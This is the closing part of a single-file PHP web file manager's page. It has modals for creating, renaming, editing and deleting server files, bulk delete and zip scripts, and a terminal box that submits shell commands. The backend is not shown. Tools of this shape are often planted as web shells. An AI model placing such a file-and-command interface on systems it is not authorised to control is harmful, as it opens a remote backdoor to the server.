                                            <input type="hidden" name="action" value="delete">
                                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                                            <button type="submit" class="btn btn-sm btn-outline-danger rounded-pill" title="Delete">
                                                <i class="bi bi-trash"></i>
                                            </button>
                                        </form>
                                    </div>

                                    <!-- Rename Modal -->
                                    <div class="modal fade" id="renameModal<?php echo md5($item); ?>" tabindex="-1">
                                        <div class="modal-dialog modal-dialog-centered">
                                            <div class="modal-content" style="border-radius: 20px;">
                                                <div class="modal-header border-0 pb-0">
                                                    <h5 class="modal-title fw-semibold">Rename Item</h5>
                                                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                                                </div>
                                                <form method="post">
                                                    <div class="modal-body">
                                                        <input type="hidden" name="action" value="rename">
                                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                        <input type="hidden" name="old" value="<?php echo htmlspecialchars($item); ?>">
                                                        <div class="mb-3">
                                                            <label class="form-label">New name</label>
                                                            <input type="text" name="new" class="form-control form-control-modern" 
                                                                   value="<?php echo htmlspecialchars($item); ?>" required>
                                                        </div>
                                                    </div>
                                                    <div class="modal-footer border-0 pt-0">
                                                        <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
                                                            Cancel
                                                        </button>
                                                        <button type="submit" class="btn btn-modern btn-modern-primary">
                                                            Save
                                                        </button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                  </div>
                                  </div>
                                 </td>
                             </tr>
                            <?php endforeach; ?>

                            <?php if (empty($allItems)): ?>
                            <tr>
                                <td colspan="7" class="text-center py-5">
                                    <div class="icon-wrapper icon-folder mx-auto mb-3" style="width: 64px; height: 64px; font-size: 2rem;">
                                        <i class="bi bi-folder-x"></i>
                                    </div>
                                    <h6 class="text-secondary">Empty folder</h6>
                                    <p class="text-secondary small">Create new folder or file to get started</p>
                                 </div>
                                 </div
                             </div>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-4">
            <p class="text-white-50 small">
                <i class="bi bi-shield-check me-1"></i>
                Secure PHP File Manager v2.0 · PHP <?php echo phpversion(); ?> Compatible
            </p>
        </div>
    </div>

    <!-- New Folder Modal -->
    <div class="modal fade" id="newFolderModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content" style="border-radius: 20px;">
                <div class="modal-header border-0 pb-0">
                    <h5 class="modal-title fw-semibold">Create New Folder</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="action" value="mkdir">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-3">
                            <label class="form-label">Folder name</label>
                            <input type="text" name="folder" class="form-control form-control-modern" 
                                   placeholder="e.g., images" required>
                        </div>
                    </div>
                    <div class="modal-footer border-0 pt-0">
                        <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
                            Cancel
                        </button>
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            Create Folder
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal fade" id="newFileModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content" style="border-radius: 20px;">
                <div class="modal-header border-0 pb-0">
                    <h5 class="modal-title fw-semibold">Create New File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="action" value="mkfile">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-3">
                            <label class="form-label">File name</label>
                            <input type="text" name="filename" class="form-control form-control-modern" 
                                   placeholder="e.g., index.html" required>
                        </div>
                    </div>
                    <div class="modal-footer border-0 pt-0">
                        <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
                            Cancel
                        </button>
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            Create File
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- File Editor Modal -->
    <?php if ($editFile): ?>
    <div class="modal fade show" id="editorModal" tabindex="-1" style="display: block;" aria-modal="true">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content" style="border-radius: 20px;">
                <div class="modal-header border-0">
                    <h5 class="modal-title fw-semibold">
                        <i class="bi bi-pencil-square me-2"></i>
                        Editing: <?php echo htmlspecialchars(basename($editFile)); ?>
                    </h5>
                    <a href="?open&p=<?php echo urlencode($cwd); ?>" class="btn-close"></a>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="action" value="save">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                        <textarea name="content" class="form-control" rows="15" 
                                  style="font-family: 'JetBrains Mono', monospace; border-radius: 16px;"><?php 
                            echo htmlspecialchars(file_get_contents($editFile)); 
                        ?></textarea>
                    </div>
                    <div class="modal-footer border-0">
                        <a href="?open&p=<?php echo urlencode($cwd); ?>" class="btn btn-secondary rounded-pill">
                            Cancel
                        </a>
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-save me-2"></i> Save Changes
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal-backdrop fade show"></div>
    <?php endif; ?>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // Auto-hide alerts after 5 seconds
        setTimeout(function() {
            const alerts = document.querySelectorAll('.alert');
            alerts.forEach(function(alert) {
                const bsAlert = new bootstrap.Alert(alert);
                bsAlert.close();
            });
        }, 5000);

        // Copy to clipboard function
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                // Show temporary notification
                const notification = document.createElement('div');
                notification.className = 'alert alert-success position-fixed top-0 start-50 translate-middle-x mt-3';
                notification.style.zIndex = '9999';
                notification.innerHTML = '<i class="bi bi-check-circle"></i> Path copied to clipboard!';
                document.body.appendChild(notification);
                setTimeout(() => notification.remove(), 2000);
            });
        }

        // Bulk operations
        let selectedItems = [];
        
        function updateBulkButtons() {
            const bulkDeleteBtn = document.getElementById('bulkDeleteBtn');
            const bulkZipBtn = document.getElementById('bulkZipBtn');
            
            if (selectedItems.length > 0) {
                bulkDeleteBtn.style.display = 'inline-block';
                bulkZipBtn.style.display = 'inline-block';
            } else {
                bulkDeleteBtn.style.display = 'none';
                bulkZipBtn.style.display = 'none';
            }
        }
        
        function updateSelectedItems() {
            selectedItems = [];
            document.querySelectorAll('.item-checkbox:checked').forEach(cb => {
                selectedItems.push(cb.value);
            });
            updateBulkButtons();
        }
        
        // Select all functionality
        const selectAllCheckbox = document.getElementById('selectAllCheckbox');
        if (selectAllCheckbox) {
            selectAllCheckbox.addEventListener('change', function(e) {
                document.querySelectorAll('.item-checkbox').forEach(cb => {
                    cb.checked = e.target.checked;
                });
                updateSelectedItems();
            });
        }
        
        const selectAllBtn = document.getElementById('selectAllBtn');
        if (selectAllBtn) {
            selectAllBtn.addEventListener('click', function() {
                const checkboxes = document.querySelectorAll('.item-checkbox');
                const allChecked = Array.from(checkboxes).every(cb => cb.checked);
                checkboxes.forEach(cb => cb.checked = !allChecked);
                updateSelectedItems();
                if (selectAllCheckbox) {
                    selectAllCheckbox.checked = !allChecked;
                }
            });
        }
        
        document.querySelectorAll('.item-checkbox').forEach(cb => {
            cb.addEventListener('change', updateSelectedItems);
        });
        
        // Bulk delete
        const bulkDeleteBtn = document.getElementById('bulkDeleteBtn');
        if (bulkDeleteBtn) {
            bulkDeleteBtn.addEventListener('click', function() {
                if (selectedItems.length === 0) return;
                
                if (confirm(`Delete ${selectedItems.length} item(s)?`)) {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.innerHTML = `
                        <input type="hidden" name="action" value="bulk_delete">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="hidden" name="selected_items" value='${JSON.stringify(selectedItems)}'>
                    `;
                    document.body.appendChild(form);
                    form.submit();
                }
            });
        }
        
        // Bulk zip
        const bulkZipBtn = document.getElementById('bulkZipBtn');
        if (bulkZipBtn) {
            bulkZipBtn.addEventListener('click', function() {
                if (selectedItems.length === 0) return;
                
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="action" value="create_zip">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <input type="hidden" name="zip_items" value='${JSON.stringify(selectedItems)}'>
                `;
                document.body.appendChild(form);
                form.submit();
            });
        }
        
        // File upload preview
        const fileInput = document.querySelector('input[type="file"][multiple]');
        if (fileInput) {
            fileInput.addEventListener('change', function() {
                const fileCount = this.files.length;
                if (fileCount > 0) {
                    const badge = document.createElement('span');
                    badge.className = 'badge bg-primary rounded-pill ms-2';
                    badge.textContent = fileCount + ' file(s)';
                    
                    const existingBadge = this.parentNode.querySelector('.badge');
                    if (existingBadge) existingBadge.remove();
                    
                    this.parentNode.appendChild(badge);
                    
                    setTimeout(() => badge.remove(), 3000);
                }
            });
        }
        
        // Add animation delay to table rows
        document.querySelectorAll('tbody tr').forEach((row, index) => {
            row.style.animationDelay = (index * 0.05) + 's';
        });
        
        // Prevent double form submission
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function() {
                const submitBtn = this.querySelector('[type="submit"]');
                if (submitBtn && !submitBtn.disabled) {
                    submitBtn.disabled = true;
                    setTimeout(() => submitBtn.disabled = false, 3000);
                }
            });
        });
        
        // Terminal command shortcuts
        const terminalInput = document.querySelector('input[name="cmd"]');
        if (terminalInput) {
            terminalInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    this.form.submit();
                }
            });
        }
        
        // Quick directory jump - auto-submit on enter
        const directoryInput = document.querySelector('input[name="directory"]');
        if (directoryInput) {
            directoryInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    this.form.submit();
                }
            });
        }
    </script>
</body>
</html>